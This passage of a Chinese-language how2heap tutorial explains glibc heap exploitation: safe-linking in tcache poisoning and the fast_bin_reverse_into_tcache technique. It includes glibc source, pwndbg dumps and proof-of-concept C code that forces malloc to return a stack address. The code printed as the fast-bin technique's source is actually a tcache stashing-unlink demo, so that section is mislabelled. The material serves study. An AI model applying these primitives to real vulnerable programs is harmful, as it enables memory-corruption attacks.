lists of Small-Bins.</span></span><br><span class="line"><span class="comment">   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with</span></span><br><span class="line"><span class="comment">   larger pages provide less entropy, although the pointer mangling</span></span><br><span class="line"><span class="comment">   still works.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line">  ((__typeof (ptr)) ((((<span class="keyword">size_t</span>) pos) &gt;&gt; <span class="number">12</span>) ^ ((<span class="keyword">size_t</span>) ptr)))</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as "in the tcache" so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache_key;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>也就是说，e-&gt;next最终指向了e-&gt;next地址右移12位后的值与当前tcache头指针值异或后的值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/8gx 0x555555757290</span><br><span class="line">0x555555757290: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x5555557572a0: 0x0000000555555757      0x717c9bfd688b67c2</span><br><span class="line">0x5555557572b0: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x5555557572c0: 0x00005550002025f7      0x717c9bfd688b67c2</span><br></pre></td></tr></table></figure></p>
<p>a-&gt;next的计算：<br>free(a)的时候，tcache bin为空，所以a-&gt;next的值为(&amp;(a-&gt;next)&gt;&gt;12)^0，即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x555555757290&gt;&gt;12 = 0x0000000555555757</span><br><span class="line">0x0000000555555757^0 = 0x0000000555555757</span><br></pre></td></tr></table></figure></p>
<p>b-&gt;next的计算：<br>free(b)的时候，tcache bin的链表头是a，所以b-&gt;next的值为(&amp;(b-&gt;next)&gt;&gt;12)^&amp;a，即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x5555557572c0&gt;&gt;12 = 0x0000000555555757</span><br><span class="line">0x0000000555555757^0x5555557572a0 = 0x00005550002025f7</span><br></pre></td></tr></table></figure></p>
<p>接下来修改b-&gt;next，原本是指向a的地址，修改成target_addr。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b-&gt;next = (&amp;(b-&gt;next)&gt;&gt;12)^target_addr</span><br><span class="line">0x0000000555555757^0x7fffffffda70 = 0x7ffaaaaa8d27</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x555555757290</span><br><span class="line">0x555555757290: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x5555557572a0: 0x0000000555555757      0x717c9bfd688b67c2</span><br><span class="line">0x5555557572b0: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x5555557572c0: 0x00007ffaaaaa8d27      0x717c9bfd688b67c2</span><br><span class="line">0x5555557572d0: 0x0000000000000000      0x0000000000020d31</span><br></pre></td></tr></table></figure>
<p>再连续申请两个chunk，第一个chunk申请到了b，再次申请到的c就会是target_addr。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	victim = tcache_get (tc_idx);</span><br><span class="line">	<span class="keyword">return</span> tag_new_usable (victim);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">"malloc(): unaligned tcache chunk detected"</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="how2heap深入浅出学习堆利用（二）"><a href="#how2heap深入浅出学习堆利用（二）" class="headerlink" title="how2heap深入浅出学习堆利用（二）"></a>how2heap深入浅出学习堆利用（二）</h1><h2 id="fast-bin-reverse-into-tcache-glibc2-34"><a href="#fast-bin-reverse-into-tcache-glibc2-34" class="headerlink" title="fast_bin_reverse_into_tcache_glibc2.34"></a>fast_bin_reverse_into_tcache_glibc2.34</h2><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><p>修改fastbin 释放的chunk的fd指针，指向伪造的chunk地址，实现任意地址覆盖。<br>在从fast bin中malloc的时候取出一个chunk，会将剩余的chunk放回到tcahce中。而fd指针已经修改为fake_chunk_addr，所以fake_chunk也会进入tcache bin的尾部，再次malloc的时候就会申请出来。</p>
<h3 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h3><p>how2heap 源码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This file demonstrates the stashing unlink attack on tcache.\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This poc has been tested on both glibc-2.27, glibc-2.29 and glibc-2.31.\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it's necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we'll create the chunk on the stack.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stack_var emulates the fake chunk we want to alloc to.\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"First let's write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You can see the value of fake_chunk-&gt;bk is:%p\n\n"</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Also, let's see the initial value of stack_var[4]:%p\n\n"</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now we alloc 9 chunks with malloc.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Then we free 7 of them in order to put them into tcache. Carefully we didn't free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n"</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n"</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"As you can see, next malloc(0x90) will return the region our fake chunk: %p\n"</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>简化版本：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">	<span class="keyword">size_t</span> *ptrs[<span class="number">14</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) ptrs[i] = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) ptrs[i] = <span class="built_in">malloc</span>(<span class="number">0x40</span>); <span class="comment">// clean tcache</span></span><br><span class="line">	<span class="keyword">size_t</span> *victim = ptrs[<span class="number">7</span>];</span><br><span class="line">	victim[<span class="number">0</span>] = (<span class="keyword">long</span>)&amp;stack_var[<span class="number">0</span>] ^ ((<span class="keyword">long</span>)victim &gt;&gt; <span class="number">12</span>); <span class="comment">//poison fastbin</span></span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x40</span>); <span class="comment">// trigger,get one from fastbin then move the rest to tcache</span></span><br><span class="line">	<span class="keyword">size_t</span> *q = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">	assert(q == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="pwndbg调试-4"><a href="#pwndbg调试-4" class="headerlink" title="pwndbg调试"></a>pwndbg调试</h3><p>申请两个tcache bin链表的长度<code>7*2=14</code>，malloc后再free，将其放入了tcache bin和fast bin。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/reverse_bins1.png" alt><br>再次malloc的时候，会先从tcache bin中搜索合适大小的chunk。所以<code>for (int i = 0; i &lt; 7; i++) ptrs[i] = malloc(0x40);</code>会将tcache bin清空。<br>这时候，将fast bin中链表头chunk的fd指针修改为伪造的chunk地址。那么再次malloc申请的时候，系统从fast bin中取出一个chunk，又将剩余的chunks会被放到tcache bin中。这时检测到fast bin链表头chunk的fd指针指向fake_chunk_addr，就也会将fake_chunk_addr放到tcache bin中。<br>注意修改fd指针的时候有PTR_PROTECT机制。在前面写过了就不再赘述。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stack_var[4]  target_addr</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> x/16gx 0x5555557574c0</span><br><span class="line">0x5555557574c0: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x5555557574d0: 0x0000000555555757      0x0000000000000000</span><br><span class="line">0x5555557574e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557574f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555757500: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555757510: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x555555757520: 0x0000555000202397      0x0000000000000000</span><br><span class="line">0x555555757530: 0x0000000000000000      0x0000000000000000</span><br><span class="line"></span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/16gx 0x5555557574c0</span><br><span class="line">0x5555557574c0: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x5555557574d0: 0x00007ffaaaaa8d37      0x0000000000000000</span><br><span class="line">0x5555557574e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557574f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555757500: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555757510: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x555555757520: 0x0000555000202397      0x0000000000000000</span><br><span class="line">0x555555757530: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>fd指针修改好了。进入malloc跟踪查看。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REMOVE_FB(fb, victim, pp)			\</span></span><br><span class="line">  <span class="keyword">do</span>							\</span><br><span class="line">    &#123;							\</span><br><span class="line">      victim = pp;					\</span><br><span class="line">      <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)				\</span><br><span class="line">	<span class="keyword">break</span>;						\</span><br><span class="line">      pp = REVEAL_PTR (victim-&gt;fd);                                     \</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (pp != <span class="literal">NULL</span> &amp;&amp; misaligned_chunk (pp)))       \</span><br><span class="line">	malloc_printerr (<span class="string">"malloc(): unaligned fastbin chunk detected"</span>); \</span><br><span class="line">    &#125;							\</span><br><span class="line">  <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, pp, victim)) \</span><br><span class="line">	 != victim);					\</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果需要的大小在fast bin的范围中</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//获取对应索引</span></span><br><span class="line">	idx = fastbin_index (nb);</span><br><span class="line">	<span class="comment">//获取对应fast bin的链表表头</span></span><br><span class="line">	mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">	mchunkptr pp;</span><br><span class="line">	victim = *fb;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//如果fast bin不为空</span></span><br><span class="line">	<span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//地址是否0x10对齐</span></span><br><span class="line">		<span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (victim)))</span><br><span class="line">			malloc_printerr (<span class="string">"malloc(): unaligned fastbin chunk detected 2"</span>);</span><br><span class="line">		<span class="comment">//单线程时候，直接取出链表头的fd指针指向的chunk</span></span><br><span class="line">		<span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">			*fb = REVEAL_PTR (victim-&gt;fd);</span><br><span class="line">		<span class="comment">//多线程多了原子操作，防止竞争</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			REMOVE_FB (fb, pp, victim);</span><br><span class="line">		<span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">			<span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">				malloc_printerr (<span class="string">"malloc(): memory corruption (fast)"</span>);</span><br><span class="line">			check_remalloced_chunk (av, victim, nb);</span><br><span class="line">			<span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">			<span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">			stash them in the tcache.  */</span></span><br><span class="line">			<span class="comment">//如果走到这里，检查对应tcache bin是不是空的，是的话就要把chunk从fast bin或者small bin中取出，放回到tcache bin中。</span></span><br><span class="line">			<span class="comment">//获取索引</span></span><br><span class="line">			<span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">			<span class="comment">//如果索引小于最大索引</span></span><br><span class="line">			<span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">			&#123;</span><br><span class="line">				mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">			<span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">			 &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (tc_victim)))</span><br><span class="line">					malloc_printerr (<span class="string">"malloc(): unaligned fastbin chunk detected 3"</span>);</span><br><span class="line">				<span class="comment">//如果是单线程</span></span><br><span class="line">				<span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">					<span class="comment">//PROTECT_PTR保护下的fd指针，通过fd来遍历tcache</span></span><br><span class="line">					*fb = REVEAL_PTR (tc_victim-&gt;fd);</span><br><span class="line">				<span class="comment">//多线程多了原子操作，防止竞争</span></span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">					<span class="comment">//tc_victim 为 NULL 说明 bin 遍历完成，则结束填充</span></span><br><span class="line">					<span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="comment">//放入对应tcache bin</span></span><br><span class="line">				tcache_put (tc_victim, tc_idx);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">			<span class="comment">//#define chunk2mem(p) ((void *)((char *)(p) + 2 * SIZE_SZ))</span></span><br><span class="line">			<span class="comment">//chunk2mem 宏根据 chunk 地址获得返回给用户的内存地址，其实就是去掉了头部数据8bytes的prev_size和8bytes的size</span></span><br><span class="line">			<span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">			alloc_perturb (p, bytes);</span><br><span class="line">			<span class="keyword">return</span> p;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
